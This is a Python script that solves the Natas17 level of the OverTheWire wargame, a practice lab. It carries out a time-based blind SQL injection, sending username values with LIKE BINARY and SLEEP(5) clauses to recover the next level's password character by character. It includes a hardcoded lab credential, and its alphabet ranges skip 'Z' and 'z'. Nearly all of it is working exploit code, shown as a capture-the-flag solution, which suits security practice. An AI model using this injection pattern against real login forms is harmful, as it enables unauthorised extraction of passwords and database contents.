# Natas17 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL = "http://natas17.natas.labs.overthewire.org/"

auth_name = 'natas17'
auth_pass = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# To guess the password, one of each letter is needed
alphabet      = [chr(x) for x in range(ord('A'),ord('Z'))]
alphabet     += [chr(x) for x in range(ord('a'),ord('z'))]
alphabet     += [str(x) for x in range(0,10)]

known_letters = ""
password      = ""

# This challenge is very similar to 'natas15', however, no output is printed
# no matter the SQL entered.
# It is STILL possible to SQL inject however, which can lead to a
# 'Sleeping SQL' injection, in which a request/querry can be sent, and IF it
# returns True, it will sleep for X seconds before returning the query.

for letter in alphabet:
    # LIKE BINARY "%'a'%" checks if 'a' exists in a given querry
    # SLEEP(5) ensures that the querry will sleep IF the querry has any results.
    DATA = dict(username='natas18" and password LIKE BINARY "%' + letter + '%" and SLEEP(5) #')
    r    = s.post(URL, data=DATA)
    if (r.elapsed.seconds >= 2):
        known_letters += letter

for x in range (0,32):
    for letter in known_letters:
        # LIKE BINARY "'a'%" checks if 'a' is the FIRST letter in a given querry"
        DATA = dict(username='natas18" and password LIKE BINARY "' + password + letter + '%" and SLEEP(5) #')
        r    = s.post(URL, data=DATA)
        if (r.elapsed.seconds >= 2):
            password += letter
            print password

if len(password) == 32:
    print "Password retrieved successfully!"